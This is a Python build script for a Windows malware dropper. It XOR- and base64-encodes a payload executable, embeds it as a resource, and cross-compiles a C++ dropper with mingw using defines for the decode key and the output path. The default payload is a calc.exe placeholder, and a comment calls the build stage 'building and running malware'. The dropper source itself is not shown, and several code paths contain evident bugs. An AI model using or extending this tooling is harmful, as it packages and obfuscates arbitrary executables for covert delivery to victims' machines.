import argparse
import base64
import hashlib
import os
import subprocess

# converts the release/debug and x86/x64 into a PE executable with mingw.
def mingw_run(file_path, file_exe_path, temp_path, configuration_bool, arch, xor_key, base64, output_file, test_output, extract):

	if (base64 == True):
		base64_integer = 1
	else:
		base64_integer = 0

	if (test_output):
		print("This is the file path: " + file_path + " This is the output path: " + file_exe_path)
		print(f'These are the notable flags in mingw: -DDROPPER_XOR_KEY={xor_key!s} -DDROPPER_BASE64={base64_integer!s} -DDROPPER_OUTPUT="{temp_path}"')

	if (arch == 64):
		mingw_version = "x86_64-w64-mingw32-g++"
		print("mingw is compiling in x64 mode. ")
	elif (arch == 86):
		mingw_version = "i686-w64-mingw32-g++"
		print("mingw is compiling in x86 mode. ")
	else:
		mingw_version = "i686-w64-mingw32-g++"
		print("The --architecture flag only acccepts 64 or 86. \nThis script will run mingw in x86 mode.")

	print("This is your mingw_version: " + mingw_version + "This is temp_path: " + temp_path)

	if (extract == True):

		if (configuration_bool == True):
			success = subprocess.run([
			mingw_version,
			"-w",
			"-fpermissive",
			file_path,
			output_file,
			"-static",
			"-static-libgcc",
			"-static-libstdc++",
			"-o",
			file_exe_path,
			"-DW7_EXTRACT",
			"-DNDEBUG",
			f'-DDROPPER_OUTPUT="{temp_path}"',
			f"-DDROPPER_XOR_KEY={xor_key!s}",
			f"-DDROPPER_BASE64={base64_integer!s}"
			])
		else:
			success = subprocess.run([
			mingw_version,
			"-g",
			"-w",
			"-fpermissive",
			file_path,
			output_file,
			"-static",
			"-static-libgcc",
			"-static-libstdc++",
			"-o",
			file_exe_path,
			"-DW7_EXTRACT",
			f'-DDROPPER_OUTPUT="{temp_path}"',
			f"-DDROPPER_XOR_KEY={xor_key!s}",
			f"-DDROPPER_BASE64={base64_integer!s}"
			])


	else:

		if (configuration_bool == True):
			success = subprocess.run([
			mingw_version,
			"-w",
			"-fpermissive",
			file_path,
			output_file,
			"-static",
			"-static-libgcc",
			"-static-libstdc++",
			"-o",
			file_exe_path,
			"-DNDEBUG",
			f'-DDROPPER_OUTPUT="{temp_path}"',
			f"-DDROPPER_XOR_KEY={xor_key!s}",
			f"-DDROPPER_BASE64={base64_integer!s}"
			])
		else:
			success = subprocess.run([
			mingw_version,
			"-g",
			"-w",
			"-fpermissive",
			file_path,
			output_file,
			"-static",
			"-static-libgcc",
			"-static-libstdc++",
			"-o",
			file_exe_path,
			f'-DDROPPER_OUTPUT="{temp_path}"',
			f"-DDROPPER_XOR_KEY={xor_key!s}",
			f"-DDROPPER_BASE64={base64_integer!s}"
			])

	# 0 for success
	return success.returncode


#compile the rc file so it can be added with g++
def rc_compile(arch, output_file, test_output, resource):

	if (arch == 86):
		windres_version = "i686-w64-mingw32-windres"
		pe_config = "pe-i386"
	elif (arch == 64):
		windres_version = "x86_64-w64-mingw32-windres"
		pe_config = "pe-x86-64"
	else:
		windres_version = "i686-w64-mingw32-windres"
		pe_config = "pe-i386"

	if (test_output == True):
		print("\nThe pe_config is: " + pe_config + "\n" + "The output of the windres cross compile is: " + output_file + "\n")

	success = subprocess.run([
	windres_version,
	"-F",
	pe_config,
	"-O",
	"coff",
	"-I",
	"FileSystem_exe_rebuild/",
	resource,
	"-o",
	output_file
	])

	# 0 for sucess
	return success.returncode

# This makes it so that the python file can take arguments.
def parse_args():
	parser = argparse.ArgumentParser(description="This is a script to encode a payload, compiles a file with mingw,  and then decode the payload.")

	# release will be prioritized if both are off.
	parser.add_argument("--release", action="store_true")
	parser.add_argument("--debug", action="store_true")

	parser.add_argument("--architecture", type=int, default=64)

	parser.add_argument("--base64", action="store_true")
	parser.add_argument("--default-xor", action="store_true")
	parser.add_argument("--xor-key", type=int, default=0)
	parser.add_argument("--both-encoding", action="store_true")
	parser.add_argument("--multiple-files", action="store_true")

	parser.add_argument("--hardcode", action="store_true")

	parser.add_argument("--input", type=str, default="")
	parser.add_argument("--output", type=str, default="")
	parser.add_argument("--resource", type=str, default="")
	parser.add_argument("--header", type=str, default="")
	parser.add_argument("--encode", type=str, default="")
	parser.add_argument("--encode-list", nargs="+", type=str, default="")
	parser.add_argument("--temp", type=str, default="")
	parser.add_argument("--extract", action="store_true")

	parser.add_argument("--keep-log", action="store_true")
	parser.add_argument("--log-number", type=int, default=0)
	parser.add_argument("--log", action="store_true")
	parser.add_argument("--logging-output", type=str, default="")

	parser.add_argument("--no-encode", action="store_true")
	parser.add_argument("--no-compile", action="store_true")
	parser.add_argument("--no-decode", action="store_true")

	# would handle the printing out of data.
	parser.add_argument("--test-output", action="store_true")

	args = parser.parse_args()

	return args

def log_file(base64, xor, error, error_message, log_number, preserve_path, payload_bytes, payload_snippet, log_subnumber):

	# Logging will handle before encoding, after encoding xor, and after encoding base64
	# and after decoding base64 and after decoding xor

	log_info = hashlib.md5(payload_bytes).hexdigest()
	pr = None

	with open(payload_snippet, "rb") as payload_read:
		pr = payload_read.read(128)

	with open(preserve_path, "a", encoding="utf-8") as file_preserve_read:
		if (base64 == False and xor == False):
			message = "This is the checksum of the file before encoding is applied from log number: " + str(log_number) + "log subnumber: " + str(log_subnumber) + "\n" + str(log_info)
		if (base64 == True):
			message = "This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: " + str(log_number) + " log subnumber: " + str(log_subnumber) + "\n" + str(log_info)
			print("Original base64 input preserved.")
		elif (xor == True):
			message = "This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: " + str(log_number) + "log subnumber: " + str(log_subnumber) + "\n" + str(log_info)
			print("Original xor input preserved.")
		elif (error == True):
			message = error_message
			print("--------------------------ERROR--------------------------\n")

		print("\n")
		message = message + "\n\n" + str(pr) + "\n"
		file_preserve_read.write(message)

def file_read(base64, xor, payload_file, test_output, encode, decode):

	if (encode == True):
		status = "encoding"
	if (decode == True):
		status = "decoding"

	arr = []
	with open(payload_file, "rb") as read_file:
		payload_bytes = read_file.read()
		payload = ""
		try:
			payload = payload_bytes.decode("utf-8")
		except UnicodeDecodeError:
			if (base64 == True):
				payload = "<This couldn't be decoded in a way that was visible from command line. That doesn't mean the base64 didn't work.>"
			elif (xor == True):
				payload = "<This couldn't be decoded in a way that was visible from command line. That doesn't mean the xor didn't work.>"

	if (test_output == True):
		if (base64 == True):
			print("This is the version after " + status + " (in the base64 function) of your payload (in hexadecimal): " + payload_bytes.hex())
		if (xor == True):
			print("This is the version after " + status + " (in the xor function) of your payload (in hexadecimal): " + payload_bytes.hex())

	arr.append(payload)
	arr.append(payload_bytes)
	return arr

def base64_file(payload_file, encode, decode, log, payload_preserve_path, log_number, test_output, log_subnumber):

	base64_encode = True
	xor_encode = False
	decode = not encode
	arr = file_read(base64_encode, xor_encode, payload_file, test_output, encode, decode)
	payload = arr[0]
	payload_bytes = arr[1]

#//////////////////////////////////////////

# Encoding logic

#//////////////////////////////////////////

	base64_log = True
	xor_log = False

	if (encode == True):
		try:
			error = False
			error_msg = None
			encoded_payload_bytes = base64.b64encode(payload_bytes)

		except Exception as e:
			error = True
			error_msg = e
			log_file(base64_log, xor_log, error, error_msg, log_number, payload_preserve_path, payload_bytes, payload_file, log_subnumber)

		if (test_output == True):
			print("This is the base64 encoded version of your payload (in hexadecimal): " + encoded_payload_bytes.hex())
		with open(payload_file, "wb") as file_write:
			file_write.write(encoded_payload_bytes)

#//////////////////////////////////////////

# Decoding logic

#//////////////////////////////////////////

	if (decode == True):
		error = False
		error_msg = None
		decoded_payload_bytes = base64.b64decode(payload_bytes)
		if (test_output == True):
			print("This is the base64 decoded version of your payload (in hexadecimal): " + decoded_payload_bytes.hex())
		with open(payload_file, "wb") as file_write:
			file_write.write(decoded_payload_bytes)

	if (log == True):
		if (encode == True):
			payload_bytes = encoded_payload_bytes
		if (decode == True):
			payload_bytes = decoded_payload_bytes

		log_file(base64_log, xor_log, error, error_msg, log_number, payload_preserve_path, payload_bytes, payload_file, log_subnumber)

def xor_file(payload_file, xor_key, encode, log, payload_preserve_path, log_number, test_output, log_subnumber):


# ////////////////////////////////////////////////////////////////////////////

# Reading from file.

# ////////////////////////////////////////////////////////////////////////////

	base64 = False
	xor = True
	decode = not encode
	arr = file_read(base64, xor, payload_file, test_output, encode, decode)
	payload = arr[0]
	payload_bytes = arr[1]

# ////////////////////////////////////////////////////////////////////////////

# Encoding, writing and logging file.

# ////////////////////////////////////////////////////////////////////////////

	encoded_payload_bytes = bytes([char ^ xor_key for char in payload_bytes])

	if (test_output == True):
		print("This is the xor encoded or decoded version of your payload (in hexadecimal): " + encoded_payload_bytes.hex())

	with open(payload_file, "wb") as file_write:
		file_write.write(encoded_payload_bytes)

	if (log == True):
		base64 = False
		xor = True
		error = False
		error_msg = None
		log_file(base64, xor, error, error_msg, log_number, payload_preserve_path, encoded_payload_bytes, payload_file, log_subnumber)

	return payload_file

def main():

	#//////////////////////////////////////////////////////

	# Setting all relevant file paths

	#//////////////////////////////////////////////////////

	args = parse_args()
	script_info = {

# The file that will be compiled by mingw
		"file_path" : r"FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp",

# The default file path to the location of Resource.rc
		"file_resource_path" : r"FileSystem_exe_rebuild/W7_resource.rc",

# The default file path to the location of Resource.h
		"file_header_path" : r"FileSystem_exe_rebuild/resource.h",

# The file that is encrypted
		"file_encode_path" : r"FileSystem_exe_rebuild/payloads/w7_calc.exe",

# The actual exe path that mingw outputs.
		"file_exe_path" : r"FileSystem_exe_rebuild/FileSystem_exe_rebuild.exe",

# The file path to the temp file that is run in the cpp script
		"temp_path" : r"temp.exe",

# Give the location of the file that will take the original contents of the payload file
		"file_payload_preserve_path" : r"preserve_payload_contents.txt"
	}

	# Setting the script_info dictionary based on flags given by the user.
	if (args.hardcode != True):

		if (args.input == ""):
			script_info["file_path"] = input("Give the file path of the file that will be cross compiled with mingw: ")
		else:
			script_info["file_path"] = args.input
			if (args.test_output == True):
				print("file_path gotten from input flag.")

		if (args.resource == ""):
			script_info["file_resource_path"] = input("Give the file path to the resource file you are going to use.")
		else:
			script_info["file_resource_path"] = args.resource
			if (args.test_output == True):
				print("file_resource_path gotten from resource flag.")

		if (args.header == ""):
			script_info["file_header_path"] = input("Give the file path to the header file you are going to use.")
		else:
			script_info["file_header_path"] = args.header
			if (args.test_output == True):
				print("file_header_path gotten from header flag.")

		if (args.encode == ""):
			script_info["file_encode_path"] = input("Set the default file path to the payload that the dropper will inject: ")
		else:
			script_info["file_encode_path"] = args.encode
			if (args.test_output == True):
				print("file_encode_path goten from encode flag.")

		if (args.temp == ""):
			script_info["temp_path"] = input("Set the file path for the temp path that will be created in the c++ file: ")
		else:
			script_info["temp_path"] = args.temp
			if (args.test_output == True):
				print("temp_path gotten from temp flag.")

		if (args.output == ""):
			script_info["file_exe_path"] = input("Give the file path to the place where the exe will place after msbuild compiles it (should have an exe file extension): ")
		else:
			script_info["file_exe_path"] = args.output
			if (args.test_output == True):
				print("File_exe_path gotten from the output flag.")

		if (args.logging_output != ""):
			script_info["file_payload_preserve_path"] = input("Give the file path to the place where logging will occur: ")
		else:
			script_info["file_payload_preserve_path"] = args.logging_output
			if (args.test_output == True):
				print("file_payload_preserve_path gotten from logging_output flag.")

		if (script_info["file_path"] == "" or script_info["file_resource_path"] == "" or script_info["file_header_path"] == "" or script_info["file_encode_path"] == "" or script_info["file_exe_path"] == "" or script_info["file_payload_preserve_path"] == ""):
			print("\nOne of the essential file paths was an empty string.")
			return 1

	else:
		# hardcode True

		# Update the exe path based on if release, debug or neither was chosen.
		# exe path is overriden if output flag flag is set.

		if (args.input != ""):
			print("file_path gotten from input flag.")
			script_info["file_path"] = args.input
			if (args.test_output == True):
				print("This is file_path: " + script_info["file_path"])

		if (args.resource != ""):
			print("file_resource_path gotten from resource flag.\n")
			script_info["file_resource_path"] = args.resource
			if (args.test_output == True):
				print("This is file_resource_path: " + script_info["file_resource_path"])

		if (args.header != ""):
			print("file_header_path gotten from header flag.\n")
			script_info["file_header_path"] = args.header
			if (args.test_output == True):
				print("This is file_header_path: " + script_info["file_header_path"])

		if (args.encode != ""):
			print("file_encode_path gotten from encode flag.\n")
			script_info["file_encode_path"] = args.encode
			if (args.test_output == True):
				print("This is file_encode_path: " + script_info["file_encode_path"])

		if (args.temp != ""):
			print("temp_path gotten from temp flag.\n")
			script_info["temp_path"] = args.temp
			if (args.test_output == True):
				print("This is the temp_path: " + script_info["temp_path"])

		if (args.output != ""):
			print("file_exe_path gotten from output flag.\n")
			script_info["file_exe_path"] = args.output
			if (args.test_output == True):
				print("This is file_exe_path: " + script_info["file_exe_path"])

		if (args.logging_output != ""):
			print("file_payload_preserve_path gotten from logging output.\n")
			script_info["file_payload_preserve_path"] = args.logging_output
			if (args.test_output == True):
				print("This is file_payload_preserve_path: " + script_info["file_payload_perserve_path"])

		if (script_info["file_exe_path"] == "" or script_info["file_path"] == "" or script_info["file_encode_path"] == "" or script_info["file_payload_preserve_path"] == ""):
			print("Hardcode files have not been set. Open up linux_mint_script.py and set them in the main function.")
			return 1

	# The script comes with no extra files besides the payload. If there is no preserve file already and logging is not opted for then file resetting will be skipped.
	if (args.log == False and (args.logging_output != "" or args.log_number != 0)):
		print("Logging was not set with --log flag however a log output file was or log number was set. Use the --log flag to turn on logging.")

	if (args.keep_log == False):
		with open(script_info["file_payload_preserve_path"], "w", encoding="utf-8") as file_write:
			file_write.write("")
			if (args.test_output == True):
				print("file_payload_preserve_path has been reset.")

	base64 = False
	xor = False
	encode = True
	decode = False
	error = False
	error_msg = None

	if args.multiple_files == True:
		for i in range(len(args.encode_list)):
			arr = file_read(base64, xor, args.encode_list[i], args.test_output, encode, decode)
			payload = arr[0]
			payload_bytes = arr[1]
			if args.log == True:
				log_file(base64, xor, error, error_msg, args.log_number, script_info["file_payload_preserve_path"], payload_bytes, args.encode_list[i], i)
	else:
		arr = file_read(base64, xor, script_info["file_encode_path"], args.test_output, encode, decode)
		payload = arr[0]
		payload_bytes = arr[1]

		if args.log == True:
			log_file(base64, xor, error, error_msg, args.log_number, script_info["file_payload_preserve_path"], payload_bytes, script_info["file_encode_path"], 0)

	if (args.both_encoding == True):
		args.base64 = True

	if (args.default_xor == True or args.both_encoding == True):
		args.xor_key = 115

	elif (args.xor_key != 0): # Handling custom xor keys and keeping them in a 0 - 255 range
		if (args.xor_key > 255 or args.xor_key < 0):
			print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
			args.xor_key = 255

	#//////////////////////////////////////////////////////

	# Encode payload

	#//////////////////////////////////////////////////////

	if (args.no_encode == True): # no encode

		encode = True
		decode = False
		error = False
		error_msg = None

		if (args.multiple_files == True):
			for i in len(args.encode_list):
				if (args.base64 == True or args.both_encoding == True):
					base64 = True
					xor = False
					arr = file_read(base64, xor, args.encode_list[i], args.test_output, encode, decode)
					payload = arr[0]
					payload_bytes = arr[1]
					if (args.log == True):
						log_file(base64, xor, error, error_msg, args.log_number, script_info["file_payload_preserve_path"], payload_byte, args.encode_list[i], i)

				if (args.default_xor == True or args.xor_key != 0 or args.both_encoding == True):
					base64 = False
					xor = True
					arr = file_read(base64, xor, args.encode_list[i], args.test_output, encode, decode)
					payload = arr[0]
					payload_bytes = arr[1]
					if (args.log == True):
						log_file(base64, xor, error, error_msg, args.log_number, script_info["file_payload_preserve_path"], payload_bytes, args.encode_list[i], i)

		else: # single file encoding

			if (args.base64 == True or args.both_encoding == True):
				if (args.logging_output != ""):
					base64 = True
					xor = False
					arr = file_read(base64, xor, script_info["file_encode_path"], args.test_output, encode, decode)
					payload = arr[0]
					payload_bytes = arr[1]
					if (args.log == True):
						log_file(base64, xor, error, error_msg, args.log_number, script_info["file_payload_preserve_path"], payload_bytes, script_info["file_encode_path"], 0)

			if (args.default_xor == True or args.xor_key == True or args.both_encoding == True):
				if (args.logging_output != ""):
					base64 = False
					xor = True
					arr = file_read(base64, xor, script_info["file_encode_path"], args.test_output, encode, decode)
					payload = arr[0]
					payload_bytes = arr[1]
					if (args.log == True):
						log_file(base64, xor, error, error_msg, args.log_number, script_info["file_payload_preserve_path"], payload_bytes, script_info["file_encode_path"], 0)

		if (args.log == True):
			print("No encode flag was chosen so nothing was encoded. Logging occurred.")
		else:
			print("No encode flag was chosen so nothing was encoded. Logging did not occurred.")
	else: # do encode

		encode = True
		if (args.multiple_files == True):
			for i in range(len(args.encode_list)):
				if (args.default_xor == True or args.both_encoding == True or args.xor_key != 0):
					xor_file(args.encode_list[i], args.xor_key, encode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, i)
					if (args.test_output):
						print(f"This xor key used is {args.xor_key} \n")
				if (args.base64 == True or args.both_encoding == True):
					decode = False
					base64_file(args.encode_list[i], encode, decode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, i)
		else: # single file encoding
			if (args.default_xor == True or args.both_encoding == True or args.xor_key != 0):
				xor_file(script_info["file_encode_path"], args.xor_key, encode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, 0)
				if (args.test_output):
					print(f"This xor key used is {args.xor_key} \n")

			# Handling base64 encoding.
			if (args.base64 == True or args.both_encoding == True):
				decode = False
				base64_file(script_info["file_encode_path"], encode, decode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, 0)



	#//////////////////////////////////////////////////////

	# building and running malware

	#//////////////////////////////////////////////////////

	if (args.no_compile == False):

		# replace the file extension of script_info["file_resource_path"] with .o
		output_file = script_info["file_resource_path"]
		output_file = os.path.splitext(output_file)[0]
		output_file = f"{output_file}.o"

		print("This is the output file: " + output_file)
		print("This is the temp path: " + script_info["temp_path"])

		if (args.resource != ""):
			resource = args.resource
		else:
			resource = script_info["file_resource_path"]

		success = rc_compile(args.architecture, output_file, args.test_output, resource)
		if (success == 0):
			print("The rc compiled successfully.")
		else:
			print("The rc did not compile successfully.")
			return 1

		if (args.release == True):
			set_mingw_release = True
			success = mingw_run(script_info["file_path"], script_info["file_exe_path"], script_info["temp_path"], set_mingw_release, args.architecture, args.xor_key, args.base64, output_file, args.test_output, args.extract)
			if (success == 0):
				print("mingw ran successfully in release mode. Warnings are turned off.")
		elif (args.debug == True):
			set_mingw_release = False
			success = mingw_run(script_info["file_path"], script_info["file_exe_path"], script_info["temp_path"], set_mingw_release, args.architecture, args.xor_key, args.base64, output_file, args.test_output, args.extract)
			if (success == 0):
				print("mingw ran successfully in debug mode. Warnings are turned off. ")
		else:
			# will run in Release mode.
			set_mingw_release = True
			success = mingw_run(script_info["file_path"], script_info["file_exe_path"], script_info["temp_path"], set_mingw_release, args.architecture, args.xor_key, args.base64, output_file, args.test_output, args.extract)
			if (success == 0):
				print("mingw ran successfully in release mode. Warnings are turned off. ")



	else:
		print("No compile was chosen so nothing was compiled.")


	#//////////////////////////////////////////////////////

	# Decode payload

	#//////////////////////////////////////////////////////

	if (args.no_decode == False):
		encode = False
		decode = True

		if (args.multiple_files == True):
			for i in range(len(args.encode_list)):
				if (args.base64 == True or args.both_encoding == True):
					base64_file(args.encode_list[i], encode, decode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, i)

				if (args.default_xor == True or args.xor_key != 0 or args.both_encoding == True):
					xor_file(args.encode_list[i], args.xor_key, False, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, i)

					if (args.test_output):
						print(f"This xor key used is {args.xor_key} \n")

		else:
			if (args.base64 == True or args.both_encoding == True):
				base64_file(script_info["file_encode_path"], encode, decode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, 0)


			if (args.default_xor == True or args.xor_key != 0 or args.both_encoding == True):
				xor_file(script_info["file_encode_path"], args.xor_key, False, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output, 0)

				if (args.test_output):
					print(f"This xor key used is {args.xor_key} \n")

	else:
		print("No decode was chosen so nothing was decoded.")
main()
